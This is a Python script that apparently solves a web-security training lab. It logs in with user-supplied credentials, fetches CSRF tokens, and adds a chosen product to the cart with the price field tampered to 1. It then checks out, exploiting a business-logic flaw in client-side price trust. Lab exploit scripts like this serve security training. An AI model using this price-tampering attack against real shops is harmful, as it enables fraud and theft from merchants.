import requests
import sys
import urllib3
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def get_csrf_token(s, url):
    r = s.get(url, verify=False)
    soup = BeautifulSoup(r.text, 'html.parser')
    csrf = soup.find("input", {'name': 'csrf'})['value']
    return csrf

def buy_item(s, url):
    # Get the target URL
    login_url = url + "/login"
    
    # Retrieve the CSRF token
    csrf_token = get_csrf_token(s, login_url)

    # Input login details from user
    username = input("(+) Enter the username for login: ").strip()
    password = input("(+) Enter the password for the username: ").strip()
    
    # Login
    print("(+) Logging in...")
    data_login = {"csrf": csrf_token, "username": username, "password": password}
    r = s.post(login_url, data=data_login, verify=False)
    res = r.text
    if "Log out" in res:
        print("(+) Successfully logged in.")

        # Add item to cart
        cart_url = url + "/cart"
        product_id = input("(+) Enter the product ID to add to cart: ").strip()
        data_cart = {"productId": product_id, "redir": "PRODUCT", "quantity": "1", "price": "1"}
        r = s.post(cart_url, data=data_cart, verify=False)

        # Checkout
        checkout_url = url + "/cart/checkout"
        checkout_csrf_token = get_csrf_token(s, cart_url)
        data_checkout = {"csrf": checkout_csrf_token}
        r = s.post(checkout_url, data=data_checkout, verify=False)

        # Check if we solved the lab
        if "Congratulations" in r.text:
            print("(+) Successfully exploited the business logic vulnerability.")
        else:
            print("(-) Could not exploit the business logic vulnerability.")
            sys.exit(-1)
    else:
        print("(-) Could not login as user.")

def main():
    # Get URL from user input
    url = input("Please enter the target URL (e.g., http://www.example.com): ").strip()
    
    # Basic URL validation
    if not url.startswith("http://") and not url.startswith("https://"):
        print("(-) Error: URL must start with http:// or https://")
        sys.exit(-1)

    s = requests.Session()
    buy_item(s, url)

if __name__ == "__main__":
    main()